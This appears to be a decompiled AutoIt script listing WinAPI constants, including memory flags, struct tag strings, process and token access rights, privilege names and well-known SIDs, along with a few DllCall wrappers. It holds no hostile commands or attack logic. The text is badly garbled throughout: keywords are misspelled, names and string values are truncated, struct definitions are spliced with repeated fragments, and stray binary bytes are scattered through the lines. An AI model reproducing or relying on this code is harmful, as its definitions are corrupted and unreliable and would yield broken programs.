GLO CONST $GMEM_FIXED = 0 
GLO CONST $GMEM_MOVE = 2 
GLO CONST $GMEM_NO = 16 
GLO CONST $GMEM_NODISCARD = 32 
GLO CONST $GMEM_ZERO = 64 
GLO CONST $GMEM_MODIFY = 128 
GLOBAL CONST $GMEM_DISCARDABLE = 256 
GLO CONST $GMEM_NOT_BANKED = 4096 
GLO CONST $GMEM_SHAR = 8192 
GLO CONST $GMEM_DDESHARE = 8192 
GLOBAL CONST $GMEM_NOTI = 16384 
GLO CONST $GMEM_LOWER = 4096 
GLOBAL CONST $GMEM_VALID_FLAGS = 32626 
GLO CONST $GMEM_INVALID_HANDLE = 32768 
GLO CONST $GP = $GMEM_FIXE + $GMEM_ZEROINIT 
GLO CONST $GH = $GMEM_MOVEABLE + $GMEM_ZEROIM 
GLOBAL CONST $MEM_COMMIIM = 4096 
GLO CONST $MEM_RESERVE = 8192 
GLOBAL CONST $MEM_TOh = 1048576 
GLO CONST $MEM_S§h = 134217728 
GLOBAL CONST $PAGE_NOAC = 1 
GLO CONST $PAGE_READONLY = 2 
GLOBAL CONST $PAGE_RE = 4 
GLO CONST $PAGE_Eh = 16 
GLO CONST $PAGE_EXECUTE_READ = 32 
GLO CONST $PAGE_EXECUTE_READW = 64 
GLO CONST $PAGE_GUAR = 256 
GLO CONST $PAGE_NOCACHE = 512 
GLOBAL CONST $MEM_DEh = 16384 
GLO CONST $MEM_RELEASE = 32768 
GLOBAL CONST $TAGP§h = "struct;long X;l" 
GLO CONST $TAGRECT = "struct;long Left;long Top;lon}¡	" 
GLO CONST $TAGSIZE = "struct;long X;l" 
GLO CONST $TAGMARGIN = "int cxLeftWidth;int cxRightWidth;int" 
GLOBAL CONST $TAGFILETI = "struct;dword Lo;d" 
GLOBAL CONST $TAGSYSTEM = "struct;word Year;word Month;word Dow;word Day;word Hour;word Mi" 
GLOBAL CONST $TAGTIME_ZONE = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBd" 
GLOBAL CONST $TAGN = "struct;hwnd hWndFrom;uint_pt" 
GLOBAL CONST $TAGCOMBOBOXEXIk∑ISf = "uint Mask;int_ptr Item;ptr Text;int TextMax;int" & "int Indent;lparam f" 
GLOBAL CONST $TAGNMCBEDRAGBEk∑ISf = $TAGNMHDR & ";int ItemID;wcha" 
GLOBAL CONST $TAGNMCBEENDEDIk∑ISf = $TAGNMHDR & ";bool fChanged;int NewSelection" 
GLOBAL CONST $TAGNMCOMBOBOXEk∑ISf = $TAGNMHDR & ";uint Mask;int_ptr Item;ptr Tex" & "int SelectedImage;int Overlay" 
GLOBAL CONST $TAGDTPRAN = "word MinYear;word MinMonth;word MinDOW;w" & "word MinSecond;word MinMSecond;word MaxYear;word Max" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;booword MinMSecond;word MaxYear;word Max" 
GLOBAL CONST $TAGNMDATETIME = $TAGNMHDR & ";dwordh" & $TAGSYSTEMTIME 
GLO CONST $TAGNMDATETI = $TAGNMHDR & ";ptr Fh" & $TAGSYSTEMTI & ";ptr pDisplay;wc" 
GLOBAL CONST $TAGNMDATETIM = $TAGNMHDR & ";ptr Format;struct;long S" 
GLOBAL CONST $TAGNMDATET = $TAGNMHDR & ";int VirtKeyA" & $TAGSYSTEM 
GLOBAL CONST $TAGNMDATETIMESTRING = $TAGNMHDR & ";ptr UserString;" & $TAGSYSTEM & ";dwordS" 
GLOBAL CONST $TAGEVENTLOGRECORD = "dword Length;dword Reserved;dword RecordNumber;dwo" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dw" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset" 
GLO CONST $TAGGDIPBITMAPDk∑ISf = "uint Width;uint Height;int Stride;in" 
GLO CONST $TAGGDIPENCODE = "byte GUID[16];ulong Count;ulò}¡	p~¡	˝¡	" 
GLO CONST $TAGGDIPENC = "uint Count;byte Paf" 
GLO CONST $TAGGDIh = "float X;float Y;float " 
GLOBAL CONST $TAGGDIPSTARTU = "uint Version;ptr Callback;bo˝¡	" 
GLOBAL CONST $TAGGDIPSTA = "ptr HookProc;pk∑–U" 
GLOBAL CONST $TAGGDIPIMAGEC = "byte CLSID[16];byte FormatID[16];ptr CodecName;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask;byte FormatID[16];ptr CodecName;" 
GLOBAL CONST $TAGGDIPPENCOD = "uint Count;byte Paf" 
GLOBAL CONST $TAGHDITEM = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam " 
GLOBAL CONST $TAGNMHDDISPINFk∑ISf = $TAGNMHDR & ";int Item;uint Mask;ptr Text;int" 
GLOBAL CONST $TAGNMHDFILTER = $TAGNMHDR & ";int Item" & $TAGRECT 
GLOBAL CONST $TAGNMHEAD = $TAGN£h & ";int Item;int B" 
GLOBAL CONST $TAGGETIPADDRESk∑ISf = "byte Field4;byte Field3;byte`}¡	8~¡	∏˝¡	" 
GLOBAL CONST $TAGNMIP = $TAGNMHDR & ";int Field;" 
GLOBAL CONST $TAGLVFIND = "struct;uint Flags;ptr " & $TAGPOINT & ";uint Direction;enf" 
GLOBAL CONST $TAGLVHIT = $TAGPOINT & ";uint Flags;int Item;int–U" 
GLOBAL CONST $TAGLVITEM = "struct;uint Mask;int Item;int SubItem;uint State;uint " & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endt SubItem;uint State;uint " 
GLOBAL CONST $TAGNMLIST = $TAGN£h & ";int Item;int SubItem;uint NewState;dy¡	qy¡	" & "struct;long ActionX;long ActionY;endstruct;lpartate;dy¡	qy¡	" 
GLOBAL CONST $TAGNMLVCUSTOMDk∑ISf = "struct;" & $TAGN & ";dword dwDrawSt" & $TAGRECT & ";dword_ptr dwItemSpec;uint uItemStat" & ";dword clrText;dword clrTextBk;int iSubItem;dword" & "int iIconPhase;int iPartId;int iStateId;struct;long TextLeft;lo" 
GLO CONST $TAGNMLVDISPINFk∑ISf = $TAGNMHDR & ";" & $TAGLVITEM 
GLOBALL CONST $TAGNMLVFINDITEM = $TAGNMHDR & ";int Star" & $TAGLVFINDINFO 
GLOBAL CONST $TAGNMLVGETINFOTIP = $TAGNMHDR & ";dword Flags;ptr Text;int TextMax;in" 
GLOBAL CONST $TAGNMITEMACTIVk∑ISf = $TAGNMHDR & ";int Index;int SubItem;uint NewS" & $TAGPOINT & ";lparam lParamk∑–U" 
GLOBAL CONST $TAGNMLVKEYDOWNk∑ISf = "align 1;" & $TAGN & ";word VKey;uint Flf" 
GLOBAL CONST $TAGNMLVSC = $TAGN£h & ";int DX;int DY" 
GLOBAL CONST $TAGMCHIT = "uint Size" & $TAGP§h & ";uint Hit;" & $TAGSYSTEM & ";" & $TAGRECT & ";int iOffset;in" 
GLOBAL CONST $TAGMCMONTHRANGk∑ISf = "word MinYear;word MinMonth;word MinDOW;word Min" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHo" & "word MaxMSeconds;short Span" 
GLOBAL CONST $TAGMCRANG = "word MinYear;word MinMonth;word MinDOW;word Min" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word Ma" & "word MaxMSeconds;short MinSet;short MaxSet" 
GLOBAL CONST $TAGMCSELR = "word MinYear;word MinMonth;word MinDOW;word Min" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word Ma" & "word Max" 
GLOBAL CONST $TAGNMDAYS = $TAGN§h & ";" & $TAGSYSTEM & ";int DayState;k∑–U" 
GLOBAL CONST $TAGNMSELCHANGEk∑ISf = $TAGNMHDR & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinutL" 
GLOBAL CONST $TAGNMOBJECTNOTk∑ISf = $TAGNMHDR & ";int Item;ptr piid;ptr pObject;" 
GLOBAL CONST $TAGNMTCKEYDOWNk∑ISf = "align 1;" & $TAGN & ";word VKey;uint Flf" 
GLOBAL CONST $TAGTVITEM = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Tex" & "int Children;lparam Param;endstruct" 
GLOBAL CONST $TAGTVITEM = "struct;" & $TAGTVITEM & ";int Integral;uint uStateEx;hwnd hwnd;in" 
GLOBAL CONST $TAGNMTREE = $TAGN£h & ";uint Act" & "struct;uint OldMask;handle OldhItem;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;in" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChil" & "struct;long PointX;long PointY;endstruct" 
GLOBAL CONST $TAGNMTVCUSTOMDk∑ISf = "struct;" & $TAGN & ";dword DrawStak∑–U" & $TAGRECT & ";dword_ptr ItemSpec;uint ItemSta" & ";dword ClrText;dword ClrTextBk;int Level;dword_ptr ItemSpec;uint ItemSta" 
GLO CONST $TAGNMTVDISPINFk∑ISf = $TAGNMHDR & ";" & $TAGTVITEM 
GLOBALT CONST $TAGNMTVGETINFOTIP = $TAGNMHDR & ";ptr Text;int TextMax;ha" 
GLOBAL CONST $TAGTVHIT = $TAGPOINT & ";uint Flags;handlef" 
GLOBAL CONST $TAGNMTV = "align 1;" & $TAGN & ";word VKey;" 
GLOBAL CONST $TAGNMMOUS = $TAGN£h & ";dword_ptr ItemSpec;dw" & $TAGPOINT & ";lparam HitInfo" 
GLOBAL CONST $TAGTOKEN_PRIV = "dword Count;align 4;int64 LUò}¡	p~¡	˝¡	" 
GLOBAL CONST $TAGIMAh = "handle hBitmap;handle hMas¡	ê˝¡	" & $TAGRECT 
GLOBAL CONST $TAGMENUINFO = "dword Size;INT Mask;dword Style;uint YMax;handle " 
GLO CONST $TAGMENUITEMINFk∑ISf = "uint Size;uint Mask;uint Type;uint State;uint ID;ha" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem" 
GLO CONST $TAGREBAR = "uint cbSize;uint fMask;uint fStyle;dword c" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle U" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader;" & $TAGRECT & ";uint uChevronStatf" 
GLO CONST $TAGNMREBARAUT = $TAGNMHDR & ";uint uBand;uint wID;lparam lParam;uint " 
GLOBAL CONST $TAGNMRBAUTOSIZk∑ISf = $TAGNMHDR & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstrong" 
GLOBAL CONST $TAGNMREBA = $TAGN£h & ";dword dwMask;uint uBand;uint fStyle" 
GLOBAL CONST $TAGNMREBARCHEVk∑ISf = $TAGNMHDR & ";uint uBand;uint w" & $TAGRECT & ";lparam lParamNM" 
GLO CONST $TAGNMREBARCHI = $TAGNMHDR & ";uint uBand;uint wR" & "struct;long CLeft;long CTop;long CRiJ}¡	c}¡	" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstr CLeft;long CTop;long CRiJ}¡	c}¡	" 
GLOBAL CONST $TAGCOLORSCHEMEk∑ISf = "dword Size;dword BtnHighligh)“" 
GLOBAL CONST $TAGNMTh = $TAGN£h & ";int iIte" & "struct;int iBitmap;int idCommand;byte fsState;byte f" & ";int cchText;ptr pt" & $TAGRECT 
GLOB CONST $TAGNMTBHOTITEM = $TAGNMHDR & ";int idOld;int id" 
GLOBAL CONST $TAGTBBUTT = "int Bitmap;int Command;byte State;byte Sty" 
GLOBAL CONST $TAGTBBUTTONINFk∑ISf = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX" 
GLOBAL CONST $TAGNETR = "dword Scope;dword Type;dword DisplayType;dword Usage;;byte Style;word CX" 
GLOBAL CONST $TAGOVERLA = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dw" 
GLOBAL CONST $TAGOPENFILENAMk∑ISf = "dword StructSize;hwnd hwndOwner;handle hInstanc" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;tyle;word CX" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx" 
GLOBAL CONST $TAGBITMAP = "struct;dword Size;long Width;long Height;word Planes;word BitCo" & "long XPelsPerMeter;long YPelsPerMeter;dword ClrUsed;dword ClrImportant;endstructre" 
GLOBAL CONST $TAGBLEND = "byte Op;byte Flags;byt" 
GLOBAL CONST $TAGGUID = "ulong Data1;ushort Data2;ushê˝¡	" 
GLOBAL CONST $TAGWINDOW = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMax∏~¡	" 
GLOBAL CONST $TAGWINh = "hwnd hWnd;hwnd InsertAfter;int X;int˛y¡	z¡	" 
GLOBAL CONST $TAGSCROLL = "uint cbSize;uint fMask;int nMin;int n" 
GLOBAL CONST $TAGSCROL = "dword cbS" & $TAGR§h & ";int dxyLineButto" & "int xyThumbBottom;int reserv8}¡	~¡	ê˝¡	" 
GLOBAL CONST $TAGLOGFON = "long Height;long Width;long Escapement;long Orient" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecisio" 
GLOBAL CONST $TAGKBDLLH = "dword vkCode;dword scanCode;dword fl" 
GLOBAL CONST $TAGPROCESS_ = "handle hProcess;handle hThread;dword" 
GLOBAL CONST $TAGSTARTUPINFOk∑ISf = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dwordâ—" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserveâ—" & "handle StdOutput;handle StdError" 
GLOBAL CONST $TAGSECURITY = "dword Length;ptr Descri" 
GLOBAL CONST $TAGWIN32_ = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSi" 
GLOBAL CONST $TAGTEXTME = "long tmHeight;long tmAscent;long tmDescent;long" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long " & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar " & "byte tmPitchAndFamily;byte tmCharSet" 
GLOBAL CONST $PROCESS_TERMINk∑ISf = 1 
GLOBAL CONST $PROCESS_CREAT = 2 
GLOBAL CONST $PROCESS_SET_S = 4 
GLOBAL CONST $PROCESS_VM = 8 
GLOBAL CONST $PROCESS_VM_REAk∑ISf = 16 
GLOBAL CONST $PROCESS_ = 32 
GLOBAL CONST $PROCESS_D = 64 
GLOBAL CONST $PROCESS_CRE = 128 
GLOBAL CONST $PROCESS_SET_QUk∑ISf = 256 
GLOBAL CONST $PROCESS_SET_IN = 512 
GLOBAL CONST $PROCESS_QUERY_ = 1024 
GLOBAL CONST $PROCESS_SUS = 2048 
GLOBAL CONST $PROCESS_A = 2035711 
GLOBAL CONST $ERROR_NO_TOKENk∑ISf = 1008 
GLOBAL CONST $SE_ASSIGNPRIM+k∑–U = "SeAssignPrimaryTN" 
GLOBAL CONST $SE_AUDIT_ = "SeAuditPE" 
GLOBAL CONST $SE_BACKUP_NAME = "SeBackupPrC" 
GLOBAL CONST $SE_CHANGE_NOT = "SeChangeNotifyPrivf" 
GLOBAL CONST $SE_CREATE_GLO = "SeCreateGlobalPrivf" 
GLOBAL CONST $SE_CREATE_PAGE = "SeCreatePagefiT" 
GLOBAL CONST $SE_CREATE_PE = "SeCreatePerma+k∑–U" 
GLOBAL CONST $SE_CREATE_ = "SeCreateTok" 
GLOBAL CONST $SE_DEBUG_ = "SeDebugP_" 
GLOBAL CONST $SE_ENABLE_DELEGATI = "SeEnableDelegak∑–U" 
GLOBAL CONST $SE_IMPERSONAT = "SeImpersonatePrivif" 
GLOBAL CONST $SE_INC_BASE_PR = "SeIncreaseBasePr" 
GLOBAL CONST $SE_INCREASE = "SeIncreaseQuR" 
GLOBAL CONST $SE_LOAD_DRIVE = "SeLoadDriverD" 
GLOBAL CONST $SE_LOCK_MEMOR = "SeLockMemoryK" 
GLOBAL CONST $SE_MACHINE_ACC = "SeMachineAccouI" 
GLOBAL CONST $SE_MANAGE_VOL = "SeManageVolumePrivf" 
GLOBAL CONST $SE_PROF_SINGLEk∑–U = "SeProfileSingleP" 
GLOBAL CONST $SE_REMOTE_SHUT = "SeRemoteShutdoT" 
GLOBAL CONST $SE_RESTORE_NAMk∑ISf = "SeRestorePrivilege" 
GLOBAL CONST $SE_SECURITY_NAME = "SeSecurityPrivilege" 
GLOBAL CONST $SE_SHUTDOWN_NAME = "SeShutdownPrivilege" 
GLOBAL CONST $SE_SYNC_AWN_NAME = "SeSyncAgentP!" 
GLOBAL CONST $SE_SYSTEM_ENV+k∑–U = "SeSystemEnvironmM" 
GLOBAL CONST $SE_SYSTEM_P = "SeSystemProfT" 
GLOBAL CONST $SE_SYSTEM = "SeSystemtimeT" 
GLOBAL CONST $SE_TAKE_OWN = "SeTakeOwnersE" 
GLOBAL CONST $SE_TCB_NA = "SeTcbPrivilege" 
GLOBAL CONST $SE_UNSOLICITED_INP = "SeUnsolicitedIk∑–U" 
GLOBAL CONST $SE_UNDOCK_NAMEk∑ISf = "SeUndockPrD" 
GLOBAL CONST $SE_PRIVILEGE_ENA = 1 
GLOBAL CONST $SE_PRIVILE = 2 
GLOBAL CONST $SE_PRIVILE = 4 
GLOBAL CONST $SE_PRIVILEGE_Uk∑–U = -2147483648 
GLOBAL CONST $SE_GROUP_ = 1 
GLOBAL CONST $SE_GROUP_ENABLk∑–U = 2 
GLOBAL CONST $SE_GROUP = 4 
GLOBAL CONST $SE_GROUP_OWNERk∑ISf = 8 
GLOBAL CONST $SE_GROUP_USE_+k∑–U = 16 
GLOBAL CONST $SE_GROUP_ = 32 
GLOBAL CONST $SE_GROUP_INTE+k∑–U = 64 
GLOBAL CONST $SE_GROUP_RESOUk∑ISf = 536870912 
GLOBAL CONST $SE_GROUP_LOGONk∑ISf = -1073741824 
GLOBAL ENh $TOKENPh = 1 , $TOKENIMPERSONATION 
GLOBAL ENUM $SECURITYANONYMOUS = 0 , $SECURITYIDENTIFICAf , $SECURITYIMPERSONATION , $SECURITYD 
GLOBAL ENUM $TOKENUSER = 1 , $TOKENGROU , $TOKENPRIVILEGES , $TOKEN§h , $TOKENPRIMARYGROUP , $TOKENDEFN , $TOKENSOUR , $TOKENTYPE , $TOKENIMPERSONA , $TOKENSTATISTICS , $TOKENRESTRICTEDSIDS , $TOKENSESSIONID , $TOKENGROUPSA , $TOKENSESSIONREFERENCE , $TOKENSANDB¡	 , $TOKENAUDN , $TOKENORIG , $TOKENELEV , $TOKENLINKEDTOKEN , $TOKENEL , $TOKENHASREL , $TOKENACCESSINFORMAA , $TOKENVIRTUALI+k∑–U , $TOKENVIRTUALI , $TOKENINTEGRITYLEVEL , $TOKENUIAC~¡	 ˛¡	 , $TOKENMANDARITYLEVEL , $TOKENLOGO~¡	 ˛¡	 
GLOBAL CONST $TOKEN_ASSIRITYLEVEL = 1 
GLO CONST $TOKEN_DUPLICATE = 2 
GLO CONST $TOKEN_IMPERSONk∑ISf = 4 
GLO CONST $TOKEN_QUE = 8 
GLO CONST $TOKEN_QUERY_SOURCE = 16 
GLO CONST $TOKEN_ADJUST_PRIVI = 32 
GLO CONST $TOKEN_ADJUST_ = 64 
GLO CONST $TOKEN_ADJU = 128 
GLO CONST $TOKEN_ADJUS = 256 
GLO CONST $TOKEN_AL = 983551 
GLO CONST $TOKEN_REA = 131080 
GLO CONST $TOKEN_WRITE = 131296 
GLOBAL CONST $TOKEN_EXE = 131072 
GLO CONST $TOKEN_HAS_TRAVk∑–U = 1 
GLO CONST $TOKEN_HAS_BAC+k∑–U = 2 
GLO CONST $TOKEN_HAS_RESTk∑–U = 4 
GLO CONST $TOKEN_HAS_ADM = 8 
GLO CONST $TOKEN_IS_REST = 16 
GLO CONST $TOKEN_SESSION_k∑–U = 32 
GLO CONST $TOKEN_SANDBOX = 64 
GLO CONST $TOKEN_HAS_IMPERS = 128 
GLO CONST $RIGHTS_DE = 65536 
GLOBAL CONST $READ_CONTROL = 131072 
GLOBAL CONST $WRITE_DAC = 262144 
GLOBAL CONST $WRITE_OWNER = 524288 
GLOBAL CONST $SYNCHRONI = 1048576 
GLO CONST $STANDARD_RIG=k∑ISf = 983040 
GLO CONST $STANDARD_R = $READ_Ch 
GLO CONST $STANDARD_RIGHTS_WRITE = $READ_C 
GLOBAL CONST $STANDARD_RIGHTS_EXf = $READ_Ch 
GLOBAL CONST $STANDARD_RIGHTS_ALL = 2031616 
GLO CONST $SPECIFIC_RIGHTS_AL = 65535 
GLO ENUM $NOT_USED_ACCESk∑ISf = 0 , $GRANT_h , $SET_A , $DENY_A_ , $REVOKE_ACCESS , $SET_AUDIT_SUCCESS , $SET_AUDIT_U 
GLOBAL ENUM $TRUSTEE_I = 0 , $TRUSTEE_IS_USER , $TRUSTEE_T , $TRUSTEE_ISE , $TRUSTEE_T , $TRUSTEE_IS_WELk∑–U , $TRUSTEE_IS_DELETED , $TRUSTEE_IS_INVALID , $TRUSTEE_ISE 
GLOBAL CONST $LOGON_WITH_PROFILE = 1 
GLOBAL CONST $LOGON_NETCREDE = 2 
GLOBAL ENUM $SIDTYPEUS = 1 , $SIDTYPh , $SIDTYPEDOMAIN , $SIDTYPT , $SIDTYPEWELLKNOWNGRf , $SIDTYPEDELETE , $SIDTYPEINVALID , $SIDTYPE , $SIDTYPECOMPUTER , $SIDTYP¡	ELETE 
GLOBAL CONST $SID_ADMINISTRATORS = "S-1-5-" 
GLOBAL CONST $SID_USERS = "S-1-5-h" 
GLOBAL CONST $SID_GUEST = "S-1-5-h" 
GLO CONST $SID_ACCOUNT_OPERATORS = "S-1-5-" 
GLOBAL CONST $SID_SERVERT_OPERATORS = "S-1-5-" 
GLOBAL CONST $SID_PRINT_OPERATORS = "S-1-5-" 
GLOBAL CONST $SID_BACKUPOPERATORS = "S-1-5-" 
GLOBAL CONST $SID_REPLICATOR = "S-1-5-" 
GLOBAL CONST $SID_OWNER = "S-1-3-0" 
GLOBAL- CONST $SID_EVERYONE = "S-1-1-0" 
GLO CONST $SID_NETWORK = "S-1-5-2" 
GLO CONST $SID_INTERACTIVE = "S-1-5-4" 
GLOBALh CONST $SID_SYSTEM = "S-1-§h" 
GLOB§h CONST $SID_AUTHENTICATED_f = "S-1-5-11" 
GLOBAL CONST $SID_SCHANNEL_Ak∑–U = "S-1-5-64-" 
GLOBAL CONST $SID_DIGEST_AUTHENTf = "S-1-5-64-" 
GLOBAL CONST $SID_NT_ = "S-1-5-80" 
GLOBALh CONST $SID_UNTRUSTED_MANDA = "S-1-16-0" 
GLOBAL CONST $SID_LOW_MANDATORY_f = "S-1-16-40" 
GLOBAL CONST $SID_MEDIUM_MA+k∑–U = "S-1-16-81" 
GLOBAL CONST $SID_MEDIUM_PLUS_ = "S-1-16-84" 
GLOBAL CONST $SID_HIGH_MAN=k∑ISf = "S-1-16h" 
GLOBAL CONST $SID_SYSTEM_MA+k∑–U = "S-1-16h" 
GLOBAL CONST $SID_PROTECTED_PROCESS = "S-1-16h" 
GLOBAL CONST $SID_SECURE_PROCES = "S-1-16h" 
GLOBAL CONST $SID_ALL_SERVICES = "S-1-5-80-" 
FUNC _WINAPI_GETLASTERRf ( $CURERR = @ERROR , $CUREXT = @EXTER ) 
LOCAL $ARES£h = DLLCALL ( "kernelh" , "dword" , "GetLas¡	A" ) 
RETURN SETE§h ( $CURE§h , $CURE§h , $ARES§h [ 0 ] ) 
ENDF§h 
FUNC _WINAPI_SEP ( $IERRCODE , $CURERRh = @ERROR , $CUREXT = @EXTER ) 
DLLCALL ( "kernelh" , "none" , "SetLas¡	SEP" , "dword" , $IERR‡y¡	e ) 
RETU§h SETE§h ( $CURE§h , $CURE§h ) 
ENDF§h 
GLO CONST $FC_NOOVERWRITE = 0 
GLOBAL CONST $FC_OVEh = 1 
GLO CONST $FT_MODIFIED = 0 
GLOBAL CONST $FT_CREATE = 1 
GLO CONST $FT_ACCESSED = 2 
GLOBAL CONST $FO_READ = 0 
GLO CONST $FO_APPEND = 1 
GLOBAL CONST $FO_OVEh = 2 
GLO CONST $FO_BINARY = 16 
GLOBAL CONST $FO_UNIh = 32 
GLOBAL CONST $FO_UTF16_ = 32 
GLO CONST $FO_UTFh = 64 
GLOBAL CONST $FO_UTF8 = 128 
GLO CONST $FO_UTF8_NOBOM = 256 
GLO CONST $EOF = - 1 
GLO CONST $FD_FILEMUSTEXIST = 1 
GLO CONST $FD_PATHMUSTEXIST = 2 
GLO CONST $FD_MULTISELECT = 4 
GLO CONST $FD_PROMPTCREATENEW = 8 
GLO CONST $FD_PROMPTOVERWRITE = 16 
GLO CONST $CREATE_NE = 1 
GLO CONST $CREATE_ALWAYS = 2 
GLOBAL CONST $OPEN_EXIS = 3 
GLO CONST $OPEN_ALWAYS = 4 
GLOBAL CONST $TRUNCATE_EXISTING = 5 
GLO CONST $INVALID_SET_ = - 1 
GLO CONST $FILE_BEGI = 0 
GLOBAL CONST $FILE_CURRENT = 1 
GLOBAL CONST $FILE§h = 2 
GLOB§h CONST $FILE_ATTRIBUTE_REAf = 1 
GLO CONST $FILE_ATTRIBUT = 2 
GLO CONST $FILE_ATTRIBUT = 4 
GLO CONST $FILE_ATTRIBU = 16 
GLO CONST $FILE_ATTRIB = 32 
GLO CONST $FILE_ATTRIBUT = 64 
GLO CONST $FILE_ATTRIBUT = 128 
GLO CONST $FILE_ATTRIBU = 256 
GLO CONST $FILE_ATTRIBUT+k∑–U = 512 
GLO CONST $FILE_ATTRIBUTEk∑–U = 1024 
GLO CONST $FILE_ATTRIBUTE = 2048 
GLO CONST $FILE_ATTRIB = 4096 
GLO CONST $FILE_ATTRIBUTE_NO = 8192 
GLO CONST $FILE_ATTRIBU = 16384 
GLO CONST $FILE_SHARE_REAk∑ISf = 1 
GLO CONST $FILE_SHA = 2 
GLO CONST $FILE_SHARE_DELk∑ISf = 4 
GLO CONST $GENERIC_A = 268435456 
GLOBAL CONST $GENERIC_EXECUTE = 536870912 
GLO CONST $GENERIC_WXECUTE = 1073741824 
GLOBAL CONST $GENERIh = -2147483648 
FUh _SENDMh ( $HWh , $IM , $WPARAM = 0 , $LPA = 0 , $IRETURN = 0 , $WPARAMTYP = "wpa" , $LPARAMTYPE = "lpa" , $SRETURNTY = "lresult" ) 
LOCAL $ARESULT = DLLCALS ( "user3§h" , $SRETURr , "SendMeT" , "hwnd" , $HWND , "uint" , $IMSGn , $WPARAMTYP , $WPARAM , $LPARA§h , $LPARAM ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , "" ) 
IF $IRET£h >= 0 AND $IRET£h <= 4 THh RET $ARESULT [ $IRETE ] 
RET $AREST 
ENDFUNC 
FUh _SENDMESSAGEA ( $HWh , $IMh , $WPARAM = 0 , $LPARAM = 0 , $IRETURN = 0 , $WPARAMTYP = "wpa" , $LPARAMTYPE = "lpa" , $SRETURNTY = "lresult" ) 
LOCAL $ARESULT = DLLCALS ( "user3§h" , $SRETURr , "SendMeT" , "hwnd" , $HWND , "uint" , $IMSGn , $WPARAMTYP , $WPARAM , $LPARA§h , $LPARAM ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , "" ) 
IF $IRET£h >= 0 AND $IRET£h <= 4 THh RET $ARESULT [ $IRETE ] 
RET $AREST 
ENDFUNC 
GLO $__GAINPROCESS_WINAf [ 64 ] [ 2 ] = [ [ 0 , 0 ] ] 
GLO $__GAWINLIST_WINAPIf [ 64 ] [ 2 ] = [ [ 0 , 0 ] ] 
GLO CONST $__WINAPICONSTAk∑–U = 48 
GLO CONST $__WINAPICONST+k∑–U = 400 
GLO CONST $__WINAPICONSTANT = 1 
GLO CONST $__WINAPICONSTANT_OUT_ = 0 
GLO CONST $__WINAPICONSTANT_CLIP = 0 
GLO CONST $__WINAPICONSTANT = 0 
GLO CONST $__WINAPICONSTANT_FORMAT_MESS8}¡	~¡	ê˝¡	 = 256 
GLO CONST $__WINAPICONSTANT_FORMA = 4096 
GLO CONST $__WINAPICONSTAk∑–U = 88 
GLO CONST $__WINAPICONSTAk∑–U = 90 
GLO CONST $HGDI_ERRO = PTR ( - 1 ) 
GLOBAL CONST $INVALID_HA = PTR ( - 1 ) 
GLO CONST $CLR_INVALID = - 1 
GLOBAL CONST $__WINAPICONSTANT = 1 
GLO CONST $__WINAPICONSTAk∑–U = 2 
GLO CONST $__WINAPICONSTANT–U = 4 
GLO CONST $__WINAPICONSTANT_FLAS = 12 
GLO CONST $__WINAPICONSTAk∑–U = 2 
GLO CONST $__WINAPICONSTA = 5 
GLO CONST $__WINAPICONS = 1 
GLO CONST $__WINAPICONSTA = 2 
GLO CONST $__WINAPICONST+k∑–U = 3 
GLO CONST $__WINAPICONST+k∑–U = 4 
GLO CONST $__WINAPICONSTANT = 8 
GLO CONST $__WINAPICONSTAk∑–U = 16 
GLO CONST $__WINAPICONSTANT_DISPLAY_DEVê˝¡	 = 1 
GLO CONST $__WINAPICONSTANT_DISPLA = 4 
GLO CONST $__WINAPICONSTANT_DISPLAY = 8 
GLO CONST $__WINAPICONSTANT_DISPLA = 16 
GLO CONST $__WINAPICONSTANT_DISPL = 32 
GLO CONST $__WINAPICONSTANT_DISPL = 134217728 
GLO CONST $NULL_BRUS = 5 
GLOBAL CONST $NULL£h = 8 
GLOBAL CONST $BLACK_h = 4 
GLOBAL CONST $DKGRAYh = 3 
GLO CONST $DC_BRUSH = 18 
GLOBAL CONST $GRAY_§h = 2 
GLOBAL CONST $HOLLOWh = $NULL_ 
GLO CONST $LTGRAYh = 1 
GLOBAL CONST $WHITE_BRU = 0 
GLO CONST $BLACK_PEN = 7 
